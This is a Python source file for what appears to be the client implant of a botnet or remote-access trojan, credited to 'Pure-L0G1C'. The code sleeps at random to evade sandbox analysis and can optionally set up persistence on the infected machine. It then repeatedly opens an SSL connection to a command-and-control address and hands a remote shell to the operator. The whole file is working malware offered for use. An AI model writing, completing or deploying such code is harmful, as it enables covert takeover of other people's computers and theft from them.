# Date: 06/04/2018
# Author: Pure-L0G1C
# Description: Bot

import sys
import ssl
import socket
import pickle
from time import sleep
from random import randint
from lib import shell, session
from os import getcwd, path, chdir

# wait, we might be in a sandbox.
sleep(randint(16, wait_time))

# auto persist
AUTO_PERSIST = auto_persist

if AUTO_PERSIST:
    shell.Shell(None, None, None).create_persist(None)

# executable
if hasattr(sys, 'frozen'):
    chdir(path.dirname(sys.executable[:-2]))

# address
IP = addr_ip
PORT = addr_port


class Bot(object):

    def __init__(self, home):
        self.shell = None
        self.home = home
        self.conn = None
        self.port = None
        self.ip = None

    def shutdown(self):
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
            self.conn.close()
        except:
            pass

    def connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        self.conn = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
        s = session.Session(self.conn)
        services = s.connect(self.ip, self.port)

        if not services:
            self.ip, self.port, self.is_active = None, None, False
            self.display_text(
                'Server is unavailable, trying again in a bit')
        else:
            self.shell = shell.Shell(s, services['args'], self.home)
            self.is_active = True
            self.shell.shell()

    # -------- UI -------- #

    def display_text(self, text):
        print('{0}{1}{0}'.format('\n\n\t', text))

    def contact_server(self, ip, port):
        self.ip, self.port = ip, int(port)
        try:
            self.connect()
        except:
            pass
        finally:
            self.shutdown()


if __name__ == '__main__':
    home = getcwd()

    while True:
        chdir(home)
        bot = Bot(home)
        bot.contact_server(IP, PORT)

        if bot.shell:
            if bot.shell.disconnected:
                break
        try:
            sleep(randint(30, 60))
        except:
            break
        del bot
